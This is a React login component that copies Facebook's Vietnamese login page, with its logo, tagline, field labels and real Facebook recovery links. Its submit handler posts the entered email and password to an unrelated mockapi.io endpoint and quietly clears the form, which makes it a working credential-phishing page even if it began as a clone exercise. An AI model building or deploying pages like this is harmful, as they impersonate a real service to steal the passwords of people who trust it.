import { useState, useRef } from "react";

import "./Form.scss";
import axios from "axios";

function FormLogin() {
  const [email, setEmail] = useState("");
  const [pass, setPass] = useState("");
  const refs = useRef();
  const [err, setErr] = useState("");

  //handleLogin
  const handleLogin = (e) => {
    e.preventDefault();
    const request = { email: email, pass: pass };

    if (request.email !== "" && request.pass !== "") {
      const postAccount = async (request) => {
        try {
          await axios.post(
            "https://62dfd2a6976ae7460bf49988.mockapi.io/acount",

            request
          );
        } catch (error) {
          console.log(error.message);
        }
      };
      postAccount(request);
      setEmail("");
      setPass("");
      refs.current.focus();
    } else {
      setErr("Vui lòng điền tài khoản");
    }
  };
  console.log(err);
  // handleEmail
  const handleEmail = (e) => {
    setEmail(e.target.value);
  };

  //handlePassWord
  const handlePassWord = (e) => {
    setPass(e.target.value);
  };

  return (
    <div className="App">
      <div className="Form">
        <div className="header">
          <div className="img">
            <img
              className="logo"
              src={require("./img/2_m12-30884.png")}
              alt="img"
            />
          </div>
          <h2 className="describe">
            Facebook giúp bạn kết nối và chia sẻ <br />
            với mọi người trong cuộc sống của bạn.
          </h2>
        </div>
        <p style={{ marginBottom: "30px", color: "red" }}>{err}</p>
        <div className="loginAcc">
          <form className="login" onSubmit={handleLogin}>
            <input
              ref={refs}
              value={email}
              onChange={handleEmail}
              className="input"
              placeholder="Email hoặc số điện thoại"
            />
            <input
              value={pass}
              type="password"
              onChange={handlePassWord}
              className="input"
              placeholder="Mật khẩu"
            />

            <button className="btn">Đăng nhập</button>

            <a
              className="link"
              href="https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0"
            >
              Quên mật khẩu ?
            </a>
            <div className="line"></div>
            <button className="createAcc">
              <a className="createAcc_link">Tạo tài khoản mới</a>
            </button>
          </form>
          <div className="footer">
            <a
              className="footer_link"
              href="https://www.facebook.com/pages/create/?ref_type=registration_form"
            >
              Tạo Trang
            </a>
            <span className="footer_describe">
              {" "}
              dành cho người nổi tiếng, thương hiệu hoặc doanh nghiệp.
            </span>
          </div>
        </div>
      </div>
    </div>
  );
}

export default FormLogin;
